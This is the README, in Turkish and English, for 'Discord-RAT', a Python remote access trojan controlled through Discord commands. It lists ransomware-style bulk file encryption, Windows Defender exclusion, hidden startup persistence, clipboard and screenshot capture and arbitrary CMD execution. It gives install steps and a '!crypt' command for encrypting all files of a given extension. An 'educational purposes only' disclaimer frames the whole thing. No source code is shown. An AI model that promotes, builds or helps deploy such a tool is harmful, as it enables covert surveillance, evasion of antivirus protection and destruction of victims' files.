# Discord-RAT

Discord: pqwok

---

## Uyarı

Bu proje yalnızca **eğitim amaçlıdır**. 

---

## Proje Açıklaması

Discord-RAT, Discord üzerinden komutlarla Windows işletim sistemlerinde çeşitli işlemleri gerçekleştirebilen bir eğitim amaçlı uzaktan erişim aracıdır (RAT). Dosya şifreleme, sistem bilgisi toplama, ekran görüntüsü alma gibi özelliklere sahiptir.

---

## Özellikler

- Dosya şifreleme (AES CBC modu)  
- Dosya yükleme ve Windows Defender hariç tutma  
- Başlangıca gizlenerek otomatik başlatma  
- Pano (clipboard) içeriğini okuma (metin ve resim)  
- Ekran görüntüsü alma  
- Sistem bilgisi gösterme (IP, RAM, Disk, OS vb.)  
- Çalışan işlemleri listeleme ve sonlandırma  
- CMD komutları çalıştırma  
- Web sitesi açma  
- Mesaj kutusu gösterme  
- Yardım komutu (!help)

---

## Gereksinimler

- Python 3.11 veya üzeri  
- Aşağıdaki Python paketleri:

---

## Kurulum

1. Depoyu klonlayın veya ZIP olarak indirin.  
2. Terminal veya komut istemcisi açın.  
3. Gerekli paketleri yükleyin:  

   pip install -r requirements.txt


4. `bot_tr.py` dosyasını açın ve `TOKEN` değişkenine Discord botunuzun tokenını girin.
5. Botu başlatın:

   python bot_tr.py


---

## Kullanım

* Discord sunucunuzda bot çevrimiçi olduktan sonra `!help` komutunu kullanarak mevcut komutları görebilirsiniz.
* Örneğin, tüm dosyaları şifrelemek için:

  ```
  !crypt <uzantı>
  ```

  (Örn: `!crypt cddbll`)
* Diğer komutlar ve detaylar için `!help` komutunu kullanın.

---

# English Version

---

## Warning

This project is for **educational purposes only**.

---

## Project Description

Discord-RAT is an educational remote access tool (RAT) that enables executing various operations on Windows operating systems via Discord commands. Features include file encryption, system information gathering, screenshot capturing, and more.

---

## Features

* File encryption (AES CBC mode)
* File upload and Windows Defender exclusion
* Hidden autorun at startup
* Reading clipboard content (text and images)
* Taking screenshots
* Displaying system information (IP, RAM, Disk, OS, etc.)
* Listing and killing processes
* Running CMD commands
* Opening websites
* Showing message boxes
* Help command (!help)

---

## Requirements

* Python 3.11 or higher
* The following Python packages:

---

## Installation

1. Clone the repository or download the ZIP.
2. Open a terminal or command prompt.
3. Install the required packages:

   pip install -r requirements.txt
4. Open `bot_tr.py` and set your Discord bot token in the `TOKEN` variable.
5. Run the bot:

   python bot_tr.py

---

## Usage

* After the bot is online in your Discord server, use the `!help` command to see available commands.
* To encrypt all files, for example:

  !crypt <extension>

  (e.g. `!crypt cddbll`)
* Use `!help` for other commands and details.

---

# License

This project is provided "as is" for educational purposes. No warranty is given.

